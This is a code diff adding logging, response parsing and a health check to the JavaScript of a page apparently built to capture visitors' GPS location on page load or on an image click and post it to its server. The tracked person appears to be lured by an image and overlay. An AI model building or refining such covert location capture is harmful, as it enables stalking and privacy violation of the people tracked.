@@ -128,19 +128,23 @@ async function autoFetchLocation() {
         }
 
         latestLocationData = location;
-        await sendLocationToServer(location);
+        const result = await sendLocationToServer(location);
 
-        showStatus('success', `✅ Auto-captured! Accuracy: ${location.accuracy}m`);
-        showResult(location);
-        updateBanner('✅', 'Location auto-captured successfully!', 'success');
-        updateGPSStatus(true);
-        
-        document.getElementById('trackingImage').src = 
-            'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Auto+Captured!';
-        document.getElementById('overlay').style.display = 'none';
+        if (result && result.success) {
+            showStatus('success', `✅ Auto-captured! Accuracy: ${location.accuracy}m`);
+            showResult(location);
+            updateBanner('✅', 'Location auto-captured successfully!', 'success');
+            updateGPSStatus(true);
+            
+            document.getElementById('trackingImage').src = 
+                'https://via.placeholder.com/600x350/28a745/ffffff?text=✅+Auto+Captured!';
+            document.getElementById('overlay').style.display = 'none';
 
-        await loadLatestLocation();
-        autoFetched = true;
+            await loadLatestLocation();
+            autoFetched = true;
+        } else {
+            throw new Error(result?.message || 'Server returned error');
+        }
 
     } catch (error) {
         console.error('Auto-fetch error:', error);
@@ -215,6 +219,9 @@ async function handleImageClick() {
 // Send location to server
 async function sendLocationToServer(location) {
     try {
+        console.log('📤 Sending location to server...');
+        console.log('📍 Location data:', location);
+
         const response = await fetch('/api/track-location', {
             method: 'POST',
             headers: {
@@ -234,7 +241,20 @@ async function sendLocationToServer(location) {
             })
         });
 
-        const result = await response.json();
+        console.log('📨 Response status:', response.status);
+        
+        // Try to parse response
+        let result;
+        try {
+            result = await response.json();
+        } catch (parseError) {
+            console.error('Failed to parse response:', parseError);
+            const text = await response.text();
+            console.error('Raw response:', text);
+            throw new Error('Invalid server response');
+        }
+
+        console.log('📨 Response data:', result);
 
         if (!result.success) {
             throw new Error(result.message || 'Server error');
@@ -243,7 +263,7 @@ async function sendLocationToServer(location) {
         return result;
     } catch (error) {
         console.error('Send error:', error);
-        throw new Error('Failed to send location to server');
+        throw new Error(`Failed to send location to server: ${error.message}`);
     }
 }
 
@@ -412,6 +432,17 @@ function hideError() {
 // ===== PAGE LOAD - AUTO FETCH =====
 window.addEventListener('load', async () => {
     console.log('📍 Location Tracker loaded on Render!');
+    console.log('🔗 Page URL:', window.location.href);
+    
+    // Check if server is reachable
+    try {
+        const healthResponse = await fetch('/health');
+        const healthData = await healthResponse.json();
+        console.log('✅ Server health:', healthData);
+    } catch (error) {
+        console.error('❌ Server health check failed:', error);
+        showStatus('error', '⚠️ Server connection issues. Please refresh.');
+    }
     
     // Get server config first
     await getServerConfig();
